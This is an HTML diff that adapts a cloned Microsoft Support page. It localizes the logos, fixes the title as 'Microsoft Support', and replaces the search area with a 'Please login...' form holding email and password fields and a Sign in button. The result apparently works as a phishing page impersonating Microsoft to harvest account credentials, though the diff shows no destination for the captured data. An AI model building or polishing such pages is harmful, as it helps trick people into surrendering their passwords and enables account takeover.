@@ -1,5 +1,3 @@
-
-
 <!DOCTYPE html>
 <html ng-app="SelfAssistWeb" text-direction ng-controller="PageController" lang="{{locale}}" xml:lang="{{locale}}">
 <head>
@@ -18,7 +16,7 @@
     <meta name="robots" content="noindex, nofollow" ng-if="noIndex" />
     <meta ng-repeat="metaTag in metaTags" name="{{metaTag.name}}" content="{{metaTag.content}}" />
     <base href="/" />
-    <title ng-bind="title"></title>    
+    <title>Microsoft Support</title>    
 
     <link href="favicon.ico" rel="shortcut icon">
     <link rel="canonical" ng-href="{{canonicalUrl}}" />
@@ -31,7 +29,7 @@
     <link href="shell.min.css" rel="stylesheet" type="text/css" />
 
 </head>
-<body>
+<body ng-class="{ 'mobile' : isMobile, 'desktop': !isMoble}" class="desktop">
 
 <div id="shell-header" class="shell-header shell-responsive " ms.pgarea="header" role="banner">
     <div class="shell-header-wrapper">
@@ -50,20 +48,14 @@
                         <li class="shell-header-user-mobile-container">
                         </li>
                                     <li class="shell-header-dropdown-label" data-navcontainer="shellmenu_3_NavContainer">
-                                            <a class="top-level-link-text ctl_headerNavLink" id="Store-navigation" href="#" role="button" aria-labelledby="shellmenu_3" aria-expanded="false" ms.title="Store" data-bi-name="Store" data-bi-slot="1" tabindex="20">
+                                            <a class="top-level-link-text ctl_headerNavLink" id="Store-navigation" href="http://www.microsoftstore.com/store/msusa/en_US/home" role="button" aria-labelledby="shellmenu_3" aria-expanded="false" ms.title="Store" data-bi-name="Store" data-bi-slot="1" tabindex="20">
                                                 Store
                                             </a>
-
-
-
-
-
-
                             </dd>
 
                 </dl>
  <li id="l1_support" class="shell-header-dropdown-label">
-                                        <a class="top-level-link-text ctl_headerNavLink" tabindex="20" href="https://support.microsoft.com/en-us" ms.title="Support" data-bi-name="Support" data-bi-slot="2">
+                                        <a class="top-level-link-text ctl_headerNavLink" tabindex="20" href="https://www.microsoft.com/en-us/windows" ms.title="Support" data-bi-name="Support" data-bi-slot="2">
                                             Products
                                         </a>
                   </li>
@@ -77,15 +69,6 @@
                 </ul>
             </div>
                 <div class="shell-header-user-container">
-                    <dl class="shell-header-user">
-                        <dt>
-                            <span id="meControl">
-                                <div class="msame_Header" tabindex="60" style="display: inline-block; height: 48px; font-size: 14px; border: 1px solid transparent; border-bottom-style: none; width: 100%;">
-                                    <div class="msame_Header_name" style="line-height: 48px; max-width: 160px; display: inline-block; vertical-align: top; font-size: 86%; color: #505050; white-space: nowrap; text-overflow: ellipsis; overflow: hidden; word-break: break-all"><a href="file://www.microsoftstore.com/store/msusa/en_US/DisplayThreePgCheckoutShoppingCartPage">Cart</a> </div>
-                                </div>
-                            </span>
-                        </dt>
-                    </dl>
                 </div>
             
             <div class="shell-header-nav-toggle " ms.cmpgrp="nav">
@@ -98,8 +81,6 @@
                                     <li>
                         <a id="shell-header-shopping-cart-mobile" href="//www.microsoftstore.com/store/msusa/en_US/DisplayThreePgCheckoutShoppingCartPage" class="shell-header-toggle-cart" title="Cart" data-bi-name="Toggle Cart" ms.title="cart" tabindex="50">
                             <i id="toggle-shell-icon-cart" class="shell-icon-cart"></i>
-                            <span class="sr-only">Cart</span>
-                            <span class="shopping-cart-amount"></span>
                         </a>
                     </li>
             </ul>
@@ -108,9 +89,7 @@
 
                     <div class="shell-header-cart">
                         <a id="shell-header-shopping-cart" href="//www.microsoftstore.com/store/msusa/en_US/DisplayThreePgCheckoutShoppingCartPage" data-bi-name="Shopping Cart" title="Cart" ms.title="cart" tabindex="50">
-                            <i class="shell-icon-cart"></i>
-                            <span class="sr-only">Cart</span>
-                            <span class="shopping-cart-amount"></span>
+                            <span><img src="cart.png"></span><span class="shopping-cart-amount"></span>
                         </a>
                     </div>
                         <iframe id="shell-cart-count" data-src="//www.microsoftstore.com/store/msusa/en_US/Content/pbPage.CartSummary" style="display: none"></iframe>
@@ -123,12 +102,12 @@
 
 </div>
 
-<div ng-if="!noChrome &amp;&amp; !hideSearch" class="ng-scope"><div ng-include="'/PartialViews/Search/SearchContainer.html'" class="ng-scope"><div id="search-box" ng-controller="SearchController" class="ng-scope">
+<div ng-if="!noChrome &amp;&amp; !hideSearch" class="ng-scope"><div class="ng-scope"><div id="search-box" ng-controller="SearchController" class="ng-scope">
     <div class="search-container jumbotron jumbotron-centered jumbotron-search home" ng-class="{'jumbotron jumbotron-centered jumbotron-search home' : displayAllContent &amp;&amp; !errorStatus, 'other' : !displayAllContent || errorStatus}">
         <div class="container">
             <div class="row">
                 <div class="centering-col  col-xl-14 col-xl-offset-5 col-lg-16 col-lg-offset-4 col-md-20 col-md-offset-2 col-xs-24">
-                    <div class="centered-content">
+                    <div style="width:50%;" class="centered-content">
                        <h1 class="jumbotron-header search-header header-large ng-binding ng-scope" id="jumbotron-header" ng-if="displayAllContent &amp;&amp; !errorStatus">Please login...</h1>
                        <div id="pageControlHost"><div><div id="Credentials">
                        <div class="container" id="CredentialsInputPane">
@@ -137,55 +116,60 @@
                        <div class="row text-subheader" data-bind="text: str['WF_STR_HeaderDefault_Title']">Sign in</div>
                        <div class="row text-body">
                        <div data-bind="text: str['WF_STR_Default_Desc']">Use your Microsoft account.</div>
-                       <div data-bind="visible: !svr.F &amp;&amp; !svr.BD">
-                       <a id="learnMoreLink" href="#" target="_top">What's this?</a></div></div>
+                      </div>
 <div class="row" data-bind="ifnot: fedView.isActive() || hrdVisible()">
 <div data-bind="if: postType() === wLive.Login.Core.Constants.PostType.Password"><fieldset><div data-bind="component: { name: 'username-field', params: { value: username.value, error: username.error, focused: usernameFocused, showProgress: username.showProgress, errors: usernameErrors, locked: lockUsername, allowPhone: svr.A, allowSkype: svr.B, validationEnabled: validationEnabled, signUpUrl: signUpUrl, resetPasswordUrl: resetPasswordUrl } }">
                        <div class="row">
                        <div class="form-group">
-                       <input name="email" type="email" placeholder="Email" aria-label="Email" maxlength="127">
+                       <input style="width:360px;height:32px" name="email" type="email" placeholder="Email" aria-label="Email" maxlength="157">
+                       <br>
+                       <br />
                       </div></div></div>
-                      <div class="row">
-                      <input name="passwd" type="password" placeholder="Password" aria-label="Password" maxlength="127">
+  <div class="row">
+    <input style="width:360px;height:32px" name="passwd" type="password" placeholder="Password" aria-label="Password" maxlength="157">
 
-                      </div></div>
-                    
-                      <div data-bind="component: { name: 'kmsi-field', params: { value: kmsi.value, locked: lockUsername } }">
-                      <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !locked"><label id="idLbl_PWD_KMSI_Cb">
-                      <input type="checkbox" data-bind="checked: value"><span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span></label></div></div>
+                    </div>
+  <div class="row" id="ftrButton">
+    <div class="col-xs-24 form-group">
+                      <input id="idSIButton9" style="width:356px;height:32px" class="btn btn-block btn-primary btn-image btn-image-svg" type="submit" data-bind=" value: str['CT_PWD_STR_SignIn_Button'], css: { 'btn-image-svg': wLive.Login.Core.Controls.Browser.Helper.isSvgImgSupported() }" value="Sign in">
+                      </div>
+                    </div>
                       </fieldset></div></div></div></div></div>
                       
 </div>
                             </div>
-                    </div>                    
+                    </div>                  
                 </div>
             </div>
         </div>
-    </div><div ng-if="!isCommercial" ng-include="'/PartialViews/Search/HelpLinks.html'" class="ng-scope"><div class="container quick-nav ng-scope home" ng-class="{'home' : displayAllContent &amp;&amp; !errorStatus, 'other' : !displayAllContent || errorStatus}">
+    </div>
+    
+<div ng-if="!isCommercial" ng-include="'/PartialViews/Search/HelpLinks.html'" class="ng-scope"><div class="container quick-nav ng-scope home" ng-class="{'home' : displayAllContent &amp;&amp; !errorStatus, 'other' : !displayAllContent || errorStatus}">
     <div class="row">
         <!-- ngRepeat: quickNavLink in view.quickNavLinks --><div class="help-link ng-scope" ng-repeat="quickNavLink in view.quickNavLinks">
             <a href="https://account.microsoft.com/?lang=en-us" ng-attr-id="{{quickNavLink.key}}" ng-href="https://account.microsoft.com/?lang=en-us" ng-click="linkClick($event, quickNavLink.key)" target="_self" id="microsoft-account">
-                <span class="win-icon ng-binding" aria-hidden="true"></span>
+                <span><img src="1.png"></span>
                 <span class="text-body ng-binding">Manage my account</span>
             </a>
         </div><!-- end ngRepeat: quickNavLink in view.quickNavLinks --><div class="help-link ng-scope" ng-repeat="quickNavLink in view.quickNavLinks">
             <a href="https://answers.microsoft.com/en-us" ng-attr-id="{{quickNavLink.key}}" ng-href="https://answers.microsoft.com/en-us" ng-click="linkClick($event, quickNavLink.key)" target="_self" id="ask-community">
-                <span class="win-icon ng-binding" aria-hidden="true"></span>
+                <span><img src="2.png"></span>
                 <span class="text-body ng-binding">Ask the community</span>
             </a>
         </div><!-- end ngRepeat: quickNavLink in view.quickNavLinks --><div class="help-link ng-scope" ng-repeat="quickNavLink in view.quickNavLinks">
             <a href="#" ng-attr-id="{{quickNavLink.key}}" ng-href="#" ng-click="linkClick($event, quickNavLink.key)" target="_self" id="contact-support">
-                <span class="win-icon ng-binding" aria-hidden="true"></span>
+                <span><img src="3.png"></span>
                 <span class="text-body ng-binding">Contact Answer Desk</span>
             </a>
         </div><!-- end ngRepeat: quickNavLink in view.quickNavLinks --><div class="help-link ng-scope" ng-repeat="quickNavLink in view.quickNavLinks">
             <a href="https://www.microsoft.com/en-us/download/" ng-attr-id="{{quickNavLink.key}}" ng-href="https://www.microsoft.com/en-us/download/" ng-click="linkClick($event, quickNavLink.key)" target="_self" id="download-center">
-                <span class="win-icon ng-binding" aria-hidden="true"></span>
+                <span><img src="4.png"></span>
                 <span class="text-body ng-binding">Find downloads</span>
             </a>
         </div><!-- end ngRepeat: quickNavLink in view.quickNavLinks -->
     </div>
-</div></div><!-- end ngIf: !isCommercial -->
+</div></div>
+
         </div>
         
         <div ng-class="{'container': !noChrome}" class="container">
@@ -202,7 +186,7 @@
     <div id="home-products-section" class="ms-product-list row">
         <!-- ngRepeat: product in view.products | limitTo:12 --><div ng-repeat="product in view.products | limitTo:12" class="col-lg-4 col-md-6 col-xs-12 ng-scope">
             <a id="i-need-help-with-0-Windows" class="product-item" ng-href="http://windows.microsoft.com/en-us/windows/support" href="http://windows.microsoft.com/en-us/windows/support">                
-                <img class="imageAsset image-as-background product-image" alt="Windows" src="661123d8-3b48-429a-a33f-e33c65d1ad08.svg">                    
+                <img class="imageAsset image-as-background product-image" alt="Windows" src="windows.svg">                    
                 <div class="product-name">
                     <div ng-class="product.isUserDevice ? 'user-product-name' : ''">
                         <!-- Inline style needed due to browser bug -->
@@ -214,7 +198,7 @@
             </a>
         </div><!-- end ngRepeat: product in view.products | limitTo:12 --><div ng-repeat="product in view.products | limitTo:12" class="col-lg-4 col-md-6 col-xs-12 ng-scope">
             <a id="i-need-help-with-1-Product-Windows-Phone" class="product-item" ng-href="https://www.windowsphone.com/en-us/how-to/wp8" href="https://www.windowsphone.com/en-us/how-to/wp8">                
-                <img ng-src="https://compass-ssl.microsoft.com/assets/2a/a7/2aa751cb-9b7e-40e6-ade8-1b0fb09c18fa.svg?n=WindowsPhone.svg" class="imageAsset image-as-background product-image" alt="Windows Phone 8" src="https://compass-ssl.microsoft.com/assets/2a/a7/2aa751cb-9b7e-40e6-ade8-1b0fb09c18fa.svg?n=WindowsPhone.svg">                    
+                <img ng-src="WindowsPhone.svg" class="imageAsset image-as-background product-image" alt="Windows Phone 8" src="WindowsPhone.svg">                    
                 <div class="product-name">
                     <div ng-class="product.isUserDevice ? 'user-product-name' : ''">
                         <!-- Inline style needed due to browser bug -->
@@ -226,7 +210,7 @@
             </a>
         </div><!-- end ngRepeat: product in view.products | limitTo:12 --><div ng-repeat="product in view.products | limitTo:12" class="col-lg-4 col-md-6 col-xs-12 ng-scope">
             <a id="i-need-help-with-2-Product-Mobile-Devices" class="product-item" ng-href="https://www.microsoft.com/en-us/mobile/support/ " href="https://www.microsoft.com/en-us/mobile/support/ ">                
-                <img ng-src="https://compass-ssl.microsoft.com/assets/32/71/327104ff-5ab4-46be-97e4-dc4f88a02a56.svg?n=mobile_devices_logo.svg" class="imageAsset image-as-background product-image" alt="Mobile devices" src="https://compass-ssl.microsoft.com/assets/32/71/327104ff-5ab4-46be-97e4-dc4f88a02a56.svg?n=mobile_devices_logo.svg">                    
+                <img ng-src="mobile_devices_logo.svg" class="imageAsset image-as-background product-image" alt="Mobile devices" src="mobile_devices_logo.svg">                    
                 <div class="product-name">
                     <div ng-class="product.isUserDevice ? 'user-product-name' : ''">
                         <!-- Inline style needed due to browser bug -->
@@ -238,7 +222,7 @@
             </a>
         </div><!-- end ngRepeat: product in view.products | limitTo:12 --><div ng-repeat="product in view.products | limitTo:12" class="col-lg-4 col-md-6 col-xs-12 ng-scope">
             <a id="i-need-help-with-3-XBox" class="product-item" ng-href="https://support.xbox.com/en-us" href="https://support.xbox.com/en-us">                
-                <img ng-src="https://compass-ssl.microsoft.com/assets/7f/65/7f65967d-1413-4ce9-a32a-e444182a7092.svg?n=Xbox.svg" class="imageAsset image-as-background product-image" alt="Xbox" src="https://compass-ssl.microsoft.com/assets/7f/65/7f65967d-1413-4ce9-a32a-e444182a7092.svg?n=Xbox.svg">                    
+                <img ng-src="Xbox.svg" class="imageAsset image-as-background product-image" alt="Xbox" src="Xbox.svg">                    
                 <div class="product-name">
                     <div ng-class="product.isUserDevice ? 'user-product-name' : ''">
                         <!-- Inline style needed due to browser bug -->
@@ -250,7 +234,7 @@
             </a>
         </div><!-- end ngRepeat: product in view.products | limitTo:12 --><div ng-repeat="product in view.products | limitTo:12" class="col-lg-4 col-md-6 col-xs-12 ng-scope">
             <a id="i-need-help-with-4-Office" class="product-item" ng-href="https://support.office.com/en-us" href="https://support.office.com/en-us">                
-                <img ng-src="https://compass-ssl.microsoft.com/assets/b2/83/b283df0b-8c1a-4f83-8daa-e5d003062189.svg?n=Office.svg" class="imageAsset image-as-background product-image" alt="Office" src="https://compass-ssl.microsoft.com/assets/b2/83/b283df0b-8c1a-4f83-8daa-e5d003062189.svg?n=Office.svg">                    
+                <img ng-src="Office.svg" class="imageAsset image-as-background product-image" alt="Office" src="Office.svg">                    
                 <div class="product-name">
                     <div ng-class="product.isUserDevice ? 'user-product-name' : ''">
                         <!-- Inline style needed due to browser bug -->
@@ -262,7 +246,7 @@
             </a>
         </div><!-- end ngRepeat: product in view.products | limitTo:12 --><div ng-repeat="product in view.products | limitTo:12" class="col-lg-4 col-md-6 col-xs-12 ng-scope">
             <a id="i-need-help-with-5-OneDrive" class="product-item" ng-href="https://support.office.com/en-us/article/OneDrive-Help-5943c2b9-fafc-4cb4-95c0-9cc73fcabb30" href="https://support.office.com/en-us/article/OneDrive-Help-5943c2b9-fafc-4cb4-95c0-9cc73fcabb30">                
-                <img ng-src="https://compass-ssl.microsoft.com/assets/6e/f2/6ef254f7-baf3-4a20-8d75-36d0905620a5.svg?n=OneDrive.svg" class="imageAsset image-as-background product-image" alt="OneDrive " src="https://compass-ssl.microsoft.com/assets/6e/f2/6ef254f7-baf3-4a20-8d75-36d0905620a5.svg?n=OneDrive.svg">                    
+                <img ng-src="OneDrive.svg" class="imageAsset image-as-background product-image" alt="OneDrive " src="OneDrive.svg">                    
                 <div class="product-name">
                     <div ng-class="product.isUserDevice ? 'user-product-name' : ''">
                         <!-- Inline style needed due to browser bug -->
@@ -274,7 +258,7 @@
             </a>
         </div><!-- end ngRepeat: product in view.products | limitTo:12 --><div ng-repeat="product in view.products | limitTo:12" class="col-lg-4 col-md-6 col-xs-12 ng-scope">
             <a id="i-need-help-with-6-Surface" class="product-item" ng-href="https://www.microsoft.com/Surface/en-us/support/" href="https://www.microsoft.com/Surface/en-us/support/">                
-                <img ng-src="https://compass-ssl.microsoft.com/assets/b8/c8/b8c8d626-450b-4209-93c8-09183aec5aae.svg?n=Surface.svg" class="imageAsset image-as-background product-image" alt="Surface" src="https://compass-ssl.microsoft.com/assets/b8/c8/b8c8d626-450b-4209-93c8-09183aec5aae.svg?n=Surface.svg">                    
+                <img ng-src="Surface.svg" class="imageAsset image-as-background product-image" alt="Surface" src="Surface.svg">                    
                 <div class="product-name">
                     <div ng-class="product.isUserDevice ? 'user-product-name' : ''">
                         <!-- Inline style needed due to browser bug -->
@@ -286,7 +270,7 @@
             </a>
         </div><!-- end ngRepeat: product in view.products | limitTo:12 --><div ng-repeat="product in view.products | limitTo:12" class="col-lg-4 col-md-6 col-xs-12 ng-scope">
             <a id="i-need-help-with-7-Microsoft-Edge" class="product-item" ng-href=" http://windows.microsoft.com/en-us/windows-10/microsoft-edge" href=" http://windows.microsoft.com/en-us/windows-10/microsoft-edge">                
-                <img ng-src="https://compass-ssl.microsoft.com/assets/86/b5/86b52157-162f-4130-ab00-3db03397c46d.svg?n=edge.svg" class="imageAsset image-as-background product-image" alt="Microsoft Edge" src="https://compass-ssl.microsoft.com/assets/86/b5/86b52157-162f-4130-ab00-3db03397c46d.svg?n=edge.svg">                    
+                <img ng-src="edge.svg" class="imageAsset image-as-background product-image" alt="Microsoft Edge" src="edge.svg">                    
                 <div class="product-name">
                     <div ng-class="product.isUserDevice ? 'user-product-name' : ''">
                         <!-- Inline style needed due to browser bug -->
@@ -298,7 +282,7 @@
             </a>
         </div><!-- end ngRepeat: product in view.products | limitTo:12 --><div ng-repeat="product in view.products | limitTo:12" class="col-lg-4 col-md-6 col-xs-12 ng-scope">
             <a id="i-need-help-with-8-Internet-Explorer" class="product-item" ng-href="http://windows.microsoft.com/en-us/internet-explorer/internet-explorer-help" href="http://windows.microsoft.com/en-us/internet-explorer/internet-explorer-help">                
-                <img ng-src="https://compass-ssl.microsoft.com/assets/c8/67/c867db4c-f328-45b8-817c-33834c70aae6.svg?n=IE.svg" class="imageAsset image-as-background product-image" alt="Internet Explorer" src="https://compass-ssl.microsoft.com/assets/c8/67/c867db4c-f328-45b8-817c-33834c70aae6.svg?n=IE.svg">                    
+                <img ng-src="IE.svg" class="imageAsset image-as-background product-image" alt="Internet Explorer" src="IE.svg">                    
                 <div class="product-name">
                     <div ng-class="product.isUserDevice ? 'user-product-name' : ''">
                         <!-- Inline style needed due to browser bug -->
@@ -310,7 +294,7 @@
             </a>
         </div><!-- end ngRepeat: product in view.products | limitTo:12 --><div ng-repeat="product in view.products | limitTo:12" class="col-lg-4 col-md-6 col-xs-12 ng-scope">
             <a id="i-need-help-with-9-Skype" class="product-item" ng-href="https://support.skype.com/en/" href="https://support.skype.com/en/">                
-                <img ng-src="https://compass-ssl.microsoft.com/assets/09/10/0910dde5-41fe-4a48-821e-3979b38f6cb8.svg?n=Skype.svg" class="imageAsset image-as-background product-image" alt="Skype" src="https://compass-ssl.microsoft.com/assets/09/10/0910dde5-41fe-4a48-821e-3979b38f6cb8.svg?n=Skype.svg">                    
+                <img ng-src="Skype.svg" class="imageAsset image-as-background product-image" alt="Skype" src="Skype.svg">                    
                 <div class="product-name">
                     <div ng-class="product.isUserDevice ? 'user-product-name' : ''">
                         <!-- Inline style needed due to browser bug -->
@@ -322,7 +306,7 @@
             </a>
         </div><!-- end ngRepeat: product in view.products | limitTo:12 --><div ng-repeat="product in view.products | limitTo:12" class="col-lg-4 col-md-6 col-xs-12 ng-scope">
             <a id="i-need-help-with-10-Outlook.com" class="product-item" ng-href="http://windows.microsoft.com/en-us/windows/outlook-help" href="http://windows.microsoft.com/en-us/windows/outlook-help">                
-                <img ng-src="https://compass-ssl.microsoft.com/assets/5f/73/5f735785-6f4c-4107-a4e6-ccc7b30e9486.svg?n=Outlook.svg" class="imageAsset image-as-background product-image" alt="Outlook.com" src="https://compass-ssl.microsoft.com/assets/5f/73/5f735785-6f4c-4107-a4e6-ccc7b30e9486.svg?n=Outlook.svg">                    
+                <img ng-src="Outlook.svg" class="imageAsset image-as-background product-image" alt="Outlook.com" src="Outlook.svg">                    
                 <div class="product-name">
                     <div ng-class="product.isUserDevice ? 'user-product-name' : ''">
                         <!-- Inline style needed due to browser bug -->
@@ -334,7 +318,7 @@
             </a>
         </div><!-- end ngRepeat: product in view.products | limitTo:12 --><div ng-repeat="product in view.products | limitTo:12" class="col-lg-4 col-md-6 col-xs-12 ng-scope">
             <a id="i-need-help-with-11-productpage-hololens" class="product-item" ng-href="/en-us/products/hololens/" href="/en-us/products/hololens/">                
-                <img ng-src="https://compass-ssl.microsoft.com/assets/d5/75/d5759537-5d8c-4e8f-a800-60017263b77b.svg?n=hololens_logo.svg" class="imageAsset image-as-background product-image" alt="HoloLens" src="https://compass-ssl.microsoft.com/assets/d5/75/d5759537-5d8c-4e8f-a800-60017263b77b.svg?n=hololens_logo.svg">                    
+                <img ng-src="hololens_logo.svg" class="imageAsset image-as-background product-image" alt="HoloLens" src="hololens_logo.svg">                    
                 <div class="product-name">
                     <div ng-class="product.isUserDevice ? 'user-product-name' : ''">
                         <!-- Inline style needed due to browser bug -->
@@ -353,7 +337,7 @@
     </div>
 </div></div>
 
-<!-- ngInclude: '/PartialViews/LinkFarm/LinkFarm.html' --><div ng-include="'/PartialViews/LinkFarm/LinkFarm.html'" class="ng-scope"><div id="link-farm" class="row ng-scope" ng-controller="LinkFarmController">
+<!-- ngInclude: 'LinkFarm.html' --><div ng-include="'/PartialViews/LinkFarm/LinkFarm.html'" class="ng-scope"><div id="link-farm" class="row ng-scope" ng-controller="LinkFarmController">
     <!-- ngRepeat: section in view.sectionList --><section class="col-md-8 col-sm-24 col-xs-24 section remove-header-rule item-section ng-scope" ng-repeat="section in view.sectionList">
         <header class="section-header">
             <h3 class="text-title ng-binding">Business, IT &amp; developer</h3>
